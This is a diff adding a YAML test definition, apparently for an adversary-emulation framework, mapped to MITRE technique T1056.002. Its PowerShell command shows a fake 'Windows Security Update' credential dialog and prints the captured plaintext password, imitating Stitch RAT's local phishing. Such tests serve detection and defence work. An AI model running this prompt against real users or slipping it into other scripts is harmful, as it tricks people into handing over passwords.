@@ -1,0 +1,14 @@
+- id: 3f962985-c063-5c3b-a4e3-a77d29f9ba6c
+  name: Soumaia ART Tests - PowerShell - Prompt User for Password
+  description: 'Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.
+
+
+    Reference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py'
+  tactic: collection
+  technique:
+    attack_id: T1056.002
+    name: 'Input Capture: GUI Input Capture'
+  platforms:
+    windows:
+      psh:
+        command: "# Creates GUI to prompt for password. Expect long pause before prompt is available.    \n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning $cred.GetNetworkCredential().Password"
